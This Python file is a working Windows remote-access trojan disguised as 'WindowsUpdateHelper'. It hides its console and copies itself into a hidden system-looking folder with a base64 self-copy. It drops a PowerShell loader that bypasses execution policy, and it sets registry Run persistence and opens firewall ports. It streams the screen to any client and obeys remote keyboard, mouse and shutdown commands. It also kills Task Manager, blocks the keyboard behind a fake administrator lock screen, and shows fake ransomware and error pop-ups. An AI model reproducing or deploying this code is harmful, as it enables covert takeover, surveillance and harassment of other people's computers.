import socket
import threading
import zlib
import time
import sys
import os
import subprocess
import importlib
import ctypes
import base64

for _imp, _pip in [('numpy', 'numpy'), ('cv2', 'opencv-python-headless'), ('pyautogui', 'pyautogui'),
                    ('keyboard', 'keyboard'), ('pynput', 'pynput'), ('psutil', 'psutil'), ('mss', 'mss')]:
    try:
        importlib.import_module(_imp)
    except ImportError:
        print(f"Installing {_pip}...")
        try:
            subprocess.check_call([sys.executable or 'python', '-m', 'pip', 'install', _pip],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            print(f"Failed to install {_pip}")

try:
    import numpy as np
    import cv2
    import pyautogui
    pyautogui.FAILSAFE = False
    import keyboard as kb
    from pynput.keyboard import Controller, Key
    import psutil
except ImportError as _e:
    print(f"Failed to import required module: {_e}")
    print("Try manually: pip install pyautogui keyboard pynput psutil opencv-python-headless numpy mss")
    sys.exit(1)



def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


def get_subnet_broadcast(ip, mask='255.255.255.0'):
    parts = ip.split('.')
    return f"{parts[0]}.{parts[1]}.{parts[2]}.255"


class RemoteControlServer:
    def __init__(self, host='0.0.0.0', port=80):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.running = False
        self.reverse_mouse = False
        self.keyboard_controller = Controller()
        self.block_taskmgr = False
        self.locked = False
        self.lock_window = None
        self.autoclick_active = False
        self.automove_active = False
        self._kb_hook = None
        self._error_spam_active = False

    def kill_conflicting_processes(self):
        try:
            self_pid = os.getpid()
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['pid'] == self_pid:
                        continue
                    name = (proc.info['name'] or '').lower()
                    if name in ('python.exe', 'python3.exe', 'wupsvc.exe'):
                        proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            time.sleep(0.5)
        except:
            pass

    def broadcast_ip(self):
        lan_ip = get_lan_ip()
        msg = f"{lan_ip}:{self.port}"
        subnet_bc = get_subnet_broadcast(lan_ip)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        targets = ['255.255.255.255', subnet_bc]
        while self.running:
            for t in targets:
                try:
                    sock.sendto(msg.encode(), (t, 45631))
                except:
                    pass
            time.sleep(2)

    def hide_console(self):
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    def _get_installed_path(self):
        dest_dir = os.path.join(os.environ.get('LOCALAPPDATA',
                                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users\\Default'),
                                             'AppData', 'Local')),
                                'Microsoft', 'Windows', 'Caches')
        for name in ['WindowsUpdateHelper.ps1', 'WindowsUpdateHelper.exe']:
            p = os.path.join(dest_dir, name)
            if os.path.exists(p):
                return p
        return None

    def add_to_startup(self, exe=None):
        try:
            import winreg
            if exe is None:
                exe = self._get_installed_path()
            if exe is None:
                exe = sys.executable
                if not exe.lower().endswith('.exe'):
                    return
            if exe.lower().endswith('.ps1'):
                exe_cmd = f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{exe}"'
            elif exe.lower().endswith('.exe'):
                exe_cmd = exe
            else:
                return
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, exe_cmd)
            winreg.CloseKey(key)
            try:
                sa_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
                    0, winreg.KEY_SET_VALUE)
            except:
                sa_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run")
            winreg.SetValueEx(sa_key, "WindowsUpdateHelper", 0, winreg.REG_BINARY,
                b'\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
            winreg.CloseKey(sa_key)
        except:
            pass

    def self_install(self):
        try:
            src = sys.executable
            if not src or not src.lower().endswith('.exe'):
                return
            if 'MICROSOFT\\WINDOWS\\CACHES' in src.upper():
                return
            import shutil, ctypes
            dest_dir = os.path.join(os.environ.get('LOCALAPPDATA',
                                    os.path.join(os.environ.get('USERPROFILE', 'C:\\Users\\Default'),
                                                 'AppData', 'Local')),
                                    'Microsoft', 'Windows', 'Caches')
            os.makedirs(dest_dir, exist_ok=True)
            dest_exe = os.path.join(dest_dir, 'WindowsUpdateHelper.exe')
            dest_ps1 = os.path.join(dest_dir, 'WindowsUpdateHelper.ps1')
            kernel32 = ctypes.windll.kernel32
            if os.path.abspath(src).lower() != os.path.abspath(dest_exe).lower():
                if not os.path.exists(dest_exe):
                    shutil.copy2(src, dest_exe)
                    kernel32.SetFileAttributesW(dest_exe, 2 | 4)
            dat = os.path.join(dest_dir, 'WindowsUpdateHelper.dat')
            pyload = None
            pld_path = os.environ.get('PLD')
            if pld_path and os.path.exists(pld_path):
                with open(pld_path) as f:
                    pyload = f.read()
            if not pyload:
                try:
                    with open(__file__, 'rb') as _f:
                        pyload = base64.b64encode(_f.read()).decode()
                except:
                    pass
            if pyload:
                try:
                    kernel32.SetFileAttributesW(dat, 128)
                    os.remove(dat)
                except:
                    pass
                with open(dat, 'w') as f:
                    f.write(pyload)
                kernel32.SetFileAttributesW(dat, 2 | 4)
            if not os.path.exists(dest_ps1):
                ps1_content = (
                    '$ProgressPreference = "SilentlyContinue"\n'
                    '$b = Get-Content "$env:LOCALAPPDATA\\Microsoft\\Windows\\Caches\\WindowsUpdateHelper.dat" -Raw -EA 0\n'
                    'if ($b) {\n'
                    '  $py = "$env:TEMP\\_run.py"\n'
                    '  [IO.File]::WriteAllText($py, [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b.Trim())))\n'
                    '  & "$env:LOCALAPPDATA\\Microsoft\\Windows\\Caches\\WindowsUpdateHelper.exe" $py\n'
                    '  Remove-Item $py -Force -ErrorAction SilentlyContinue\n'
                    '} else {\n'
                    '  & "$env:LOCALAPPDATA\\Microsoft\\Windows\\Caches\\WindowsUpdateHelper.exe"\n'
                    '}\n'
                )
                with open(dest_ps1, 'w', encoding='utf-8') as f:
                    f.write(ps1_content)
                kernel32.SetFileAttributesW(dest_ps1, 2 | 4)
            self.add_to_startup(dest_ps1)
        except:
            pass

    def add_firewall_rules(self):
        try:
            subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                'name=WindowsUpdateSvc', 'dir=in', 'action=allow',
                'protocol=TCP', f'localport={self.port}',
                'profile=any', 'enable=yes'],
                capture_output=True, shell=True)
            subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                'name=WindowsUdpDiscovery', 'dir=in', 'action=allow',
                'protocol=UDP', 'localport=45631',
                'profile=any', 'enable=yes'],
                capture_output=True, shell=True)
        except:
            pass

    def start(self):
        try:
            self.kill_conflicting_processes()
            self.self_install()
            self.add_firewall_rules()
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            for _retry in range(10):
                try:
                    self.server_socket.bind((self.host, self.port))
                    break
                except OSError:
                    if _retry == 9:
                        raise
                    time.sleep(1)
            self.server_socket.listen(1)
            self.running = True

            taskmgr_thread = threading.Thread(
                target=self.monitor_task_manager,
                daemon=True
            )
            taskmgr_thread.start()

            broadcast_thread = threading.Thread(
                target=self.broadcast_ip,
                daemon=True
            )
            broadcast_thread.start()

            lan_ip = get_lan_ip()
            print(f"Server started on {self.host}:{self.port}")
            print(f"LAN IP: {lan_ip}:{self.port}")
            print(f"Waiting for connections...")
            self.hide_console()
        except Exception as _e:
            print(f"Startup error: {_e}")
            return
        except:
            print("Unknown startup error")
            return

        try:
            while self.running:
                self.client_socket, addr = self.server_socket.accept()
                print(f"Connected by {addr}")

                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(self.client_socket,),
                    daemon=True
                )
                client_thread.start()

        except KeyboardInterrupt:
            print("\nShutting down server...")
        finally:
            self.stop()

    def stop(self):
        self.running = False
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        print("Server stopped")

    def stream_screens(self, client_socket):
        import mss
        with mss.mss() as sct:
            while self.running:
                try:
                    img = cv2.cvtColor(np.array(sct.grab(sct.monitors[0])), cv2.COLOR_BGRA2BGR)
                    _, enc = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 40])
                    client_socket.sendall(len(enc).to_bytes(4, 'big') + enc.tobytes())
                except:
                    break

    def handle_client(self, client_socket):
        threading.Thread(target=self.stream_screens, args=(client_socket,), daemon=True).start()
        try:
            while self.running:
                command = client_socket.recv(4096).decode().strip()
                if not command:
                    break
                self.process_command(command)
        except ConnectionResetError:
            print("Client disconnected")
        except Exception as e:
            print(f"Client error: {e}")
        finally:
            client_socket.close()
            print("Client connection closed")

    def bg(self, target, args=()):
        threading.Thread(target=target, args=args, daemon=True).start()

    def process_command(self, command):
        try:
            parts = command.split()
            cmd = parts[0].lower()

            if cmd == "move" and len(parts) == 3:
                x, y = map(int, parts[1:3])
                pyautogui.moveRel(x, y)

            elif cmd == "click" and len(parts) == 2:
                pyautogui.click(button=parts[1].lower())

            elif cmd == "click_at" and len(parts) == 3:
                x, y = int(parts[1]), int(parts[2])
                pyautogui.moveTo(x, y)
                pyautogui.click()

            elif cmd == "automove":
                self.bg(self._automove, (parts,))

            elif cmd == "autoclick":
                self.bg(self._autoclick, (parts,))

            elif cmd == "rick":
                self.bg(self.play_rick_roll)

            elif cmd == "fake_virus":
                self.bg(self.show_fake_virus)

            elif cmd == "shutdown":
                os.system("shutdown /s /t 1")

            elif cmd == "fake_error":
                self.bg(self.show_fake_error)

            elif cmd == "error_spam":
                self._error_spam_active = not self._error_spam_active
                if self._error_spam_active:
                    self.bg(self._error_spam)

            elif cmd == "reverse_mouse":
                self.reverse_mouse = not self.reverse_mouse

            elif cmd == "type":
                self.keyboard_controller.type(' '.join(parts[1:]))

            elif cmd == "open" and len(parts) > 1:
                self.bg(self._open_url, (parts,))

            elif cmd == "key" and len(parts) > 1:
                self.press_key(parts[1])

            elif cmd == "special_key" and len(parts) > 1:
                self.press_special_key(parts[1])

            elif cmd == "block_taskmgr":
                self.block_taskmgr = not self.block_taskmgr

            elif cmd == "lock_screen":
                self.bg(self.lock_screen)

            elif cmd == "unlock":
                self.bg(self.unlock_screen)

            elif cmd == "exit":
                self.running = False

        except Exception as e:
            print(f"Command error: {e}")

    def _automove(self, parts):
        if self.automove_active:
            return
        self.automove_active = True
        try:
            speed = 0.5 if len(parts) < 2 else float(parts[1])
            pyautogui.moveRel(100, 0, duration=speed)
            pyautogui.moveRel(0, 100, duration=speed)
            pyautogui.moveRel(-100, 0, duration=speed)
            pyautogui.moveRel(0, -100, duration=speed)
        finally:
            self.automove_active = False

    def _autoclick(self, parts):
        if self.autoclick_active:
            return
        self.autoclick_active = True
        try:
            interval = 1.0 if len(parts) < 2 else float(parts[1])
            duration = float(parts[2]) if len(parts) > 2 else 10.0
            end = time.time() + duration
            while time.time() < end and self.running:
                pyautogui.click()
                time.sleep(interval)
        finally:
            self.autoclick_active = False

    def _open_url(self, parts):
        import webbrowser
        webbrowser.open(' '.join(parts[1:]))

    def lock_screen(self):
        self.locked = True
        try:
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            HOOKPROC = ctypes.WINFUNCTYPE(wintypes.LPARAM, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
            def proc(nCode, wParam, lParam):
                if nCode >= 0:
                    return 1
                return user32.CallNextHookEx(None, nCode, wParam, lParam)
            self._kb_hook_proc = HOOKPROC(proc)
            self._kb_hook = user32.SetWindowsHookExW(13, self._kb_hook_proc, kernel32.GetModuleHandleW(None), 0)
        except:
            pass
        try:
            import tkinter as tk
            import ctypes
            user32 = ctypes.windll.user32
            vx = user32.GetSystemMetrics(76)
            vy = user32.GetSystemMetrics(77)
            vw = user32.GetSystemMetrics(78)
            vh = user32.GetSystemMetrics(79)
            win = tk.Tk()
            win.overrideredirect(True)
            win.geometry(f"{vw}x{vh}+{vx}+{vy}")
            win.attributes('-topmost', True)
            win.configure(bg='#0078d7')
            win.focus_force()
            win.lift()
            win.grab_set()
            frame = tk.Frame(win, bg='#0078d7')
            frame.pack(expand=True, fill='both')
            tk.Label(frame, text="Windows Locked", fg='white', bg='#0078d7',
                     font=('Segoe UI', 48, 'bold')).pack(pady=(150, 20))
            tk.Label(frame, text="This computer has been locked by the system administrator.", fg='#cce5ff', bg='#0078d7',
                     font=('Segoe UI', 16)).pack(pady=10)
            tk.Label(frame, text="Enter password to unlock", fg='#cce5ff', bg='#0078d7',
                     font=('Segoe UI', 14)).pack(pady=30)
            pw_frame = tk.Frame(frame, bg='#0078d7')
            pw_frame.pack()
            tk.Label(pw_frame, text="Password:", fg='white', bg='#0078d7',
                     font=('Segoe UI', 14)).pack(side='left', padx=10)
            pw = tk.Entry(pw_frame, show='*', font=('Segoe UI', 14), width=20)
            pw.pack(side='left')
            pw.focus_force()
            self.lock_window = win
            win.mainloop()
        except Exception as e:
            print(f"Lock screen error: {e}")

    def unlock_screen(self):
        self.locked = False
        if self.lock_window:
            try:
                self.lock_window.grab_release()
                self.lock_window.after(0, self.lock_window.destroy)
            except:
                pass
            self.lock_window = None
        try:
            if self._kb_hook:
                ctypes.windll.user32.UnhookWindowsHookEx(self._kb_hook)
                self._kb_hook = None
        except:
            pass

    def kill_task_manager(self):
        try:
            import psutil
            for proc in psutil.process_iter(['name', 'pid']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                        proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except:
            pass
        import subprocess
        subprocess.run(['taskkill', '/f', '/im', 'Taskmgr.exe'], capture_output=True, shell=True)
        try:
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            enum_proc = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
            def callback(hwnd, lparam):
                titles = ('Task Manager', 'Диспетчер задач', 'TaskManagerWindow')
                buf = ctypes.create_unicode_buffer(256)
                user32.GetWindowTextW(hwnd, buf, 256)
                for t in titles:
                    if t in buf.value:
                        user32.PostMessageW(hwnd, 0x0010, 0, 0)
                        break
                cls = ctypes.create_unicode_buffer(64)
                user32.GetClassNameW(hwnd, cls, 64)
                if 'TaskManager' in cls.value:
                    user32.PostMessageW(hwnd, 0x0010, 0, 0)
                return True
            user32.EnumWindows(enum_proc(callback), 0)
        except:
            pass

    def monitor_task_manager(self):
        while self.running:
            if self.block_taskmgr:
                self.kill_task_manager()
            time.sleep(0.3)

    def press_key(self, key):
        try:
            self.keyboard_controller.press(key)
            time.sleep(0.05)
            self.keyboard_controller.release(key)
        except Exception as e:
            print(f"Error pressing key {key}: {e}")

    def press_special_key(self, key_name):
        try:
            special_keys = {
                'ctrl': Key.ctrl, 'shift': Key.shift, 'alt': Key.alt,
                'enter': Key.enter, 'esc': Key.esc, 'space': Key.space,
                'tab': Key.tab, 'backspace': Key.backspace, 'delete': Key.delete,
                'up': Key.up, 'down': Key.down, 'left': Key.left, 'right': Key.right
            }
            key = special_keys.get(key_name.lower())
            if key:
                self.keyboard_controller.press(key)
                time.sleep(0.05)
                self.keyboard_controller.release(key)
        except Exception as e:
            print(f"Error pressing special key {key_name}: {e}")

    def play_rick_roll(self):
        try:
            os.system('start https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        except:
            pass

    def show_fake_virus(self):
        try:
            import tkinter as tk
            win = tk.Tk()
            win.title("Virus Alert")
            win.geometry("500x300+{}+{}".format(
                (win.winfo_screenwidth()-500)//2, (win.winfo_screenheight()-300)//2))
            win.configure(bg='#1a0000')
            win.attributes('-topmost', True)
            win.focus_force()
            win.lift()
            tk.Label(win, text="CRITICAL ERROR", fg='#ff0000', bg='#1a0000',
                     font=('Arial', 28, 'bold')).pack(pady=30)
            tk.Label(win, text="Your computer has been infected!\nAll files will be encrypted.",
                     fg='#ff6666', bg='#1a0000', font=('Arial', 14)).pack(pady=10)
            tk.Button(win, text="OK", command=win.destroy, bg='#330000',
                      fg='#fff', font=('Arial', 12)).pack(pady=20)
            win.mainloop()
        except:
            pass

    def show_fake_error(self):
        try:
            import tkinter as tk
            win = tk.Tk()
            win.title("System Error")
            win.geometry("480x250+{}+{}".format(
                (win.winfo_screenwidth()-480)//2, (win.winfo_screenheight()-250)//2))
            win.configure(bg='#000033')
            win.attributes('-topmost', True)
            win.focus_force()
            win.lift()
            tk.Label(win, text="SYSTEM CRITICAL ERROR", fg='#4488ff', bg='#000033',
                     font=('Arial', 22, 'bold')).pack(pady=30)
            tk.Label(win, text="Windows has encountered a critical error!\nError code: 0x80070002\n\n"
                     "The system will shut down automatically.",
                     fg='#88bbff', bg='#000033', font=('Arial', 13)).pack(pady=10)
            tk.Button(win, text="Close", command=win.destroy, bg='#001133',
                      fg='#fff', font=('Arial', 12)).pack(pady=20)
            win.mainloop()
        except:
            pass

    def _error_spam(self):
        import tkinter as tk
        import random
        errors = [
            ("CRITICAL ERROR", "A fatal exception has occurred!\nError code: 0x{:08X}\nThe application will terminate.", "#1a0000", "#ff0000"),
            ("SYSTEM FAILURE", "Windows has detected a critical system error!\nError: 0x{:08X}\nImmediate action required.", "#000033", "#4488ff"),
            ("MEMORY ERROR", "Insufficient memory to complete operation.\nError code: 0x{:08X}\nClose all applications.", "#1a001a", "#ff44ff"),
            ("DISK ERROR", "Hard disk drive error detected!\nSector failure at 0x{:08X}\nBackup your data immediately.", "#001a00", "#44ff44"),
            ("NETWORK ERROR", "Network connection lost.\nSocket error: 0x{:08X}\nCheck your network settings.", "#1a1a00", "#ffff44"),
            ("DRIVER ERROR", "Device driver stopped responding.\nIRQL_NOT_LESS_OR_EQUAL 0x{:08X}", "#001a1a", "#44ffff"),
            ("REGISTRY ERROR", "Windows registry is corrupted!\nError: 0x{:08X}\nSystem instability detected.", "#1a001a", "#ff44ff"),
            ("KERNEL PANIC", "Kernel security check failure!\nBug check code: 0x{:08X}", "#000000", "#ff0000"),
            ("ACCESS VIOLATION", "Memory access violation at address 0x{:08X}\nThe memory could not be read.", "#1a1a1a", "#ff8800"),
            ("DLL ERROR", "System file missing: ntdll.dll\nError: 0x{:08X}\nReinstall Windows.", "#000033", "#00aaff"),
        ]
        while self._error_spam_active:
            try:
                win = tk.Tk()
                title, msg, bg, fg = random.choice(errors)
                err_code = random.randint(0x80000000, 0xFFFFFFFF)
                sw = win.winfo_screenwidth()
                sh = win.winfo_screenheight()
                x = random.randint(0, max(0, sw - 400))
                y = random.randint(0, max(0, sh - 200))
                win.title(title)
                win.geometry("400x180+{}+{}".format(x, y))
                win.configure(bg=bg)
                win.attributes('-topmost', True)
                win.focus_force()
                tk.Label(win, text=title, fg=fg, bg=bg,
                         font=('Arial', 16, 'bold')).pack(pady=15)
                tk.Label(win, text=msg.format(err_code), fg='#cccccc', bg=bg,
                         font=('Arial', 10)).pack(pady=5)
                tk.Button(win, text="OK", command=win.destroy, bg='#333333',
                          fg='#fff', font=('Arial', 10)).pack(pady=10)
                win.after(3000, win.destroy)
                win.update()
            except:
                pass
            time.sleep(random.uniform(0.1, 0.4))


if __name__ == "__main__":
    try:
        import keyboard
        from pynput.keyboard import Controller
        import psutil
    except ImportError as e:
        print(f"Error: Required library not found - {e}")
        print("Please install with: pip install pyautogui keyboard pynput psutil")
        sys.exit(1)

    server = RemoteControlServer()
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()
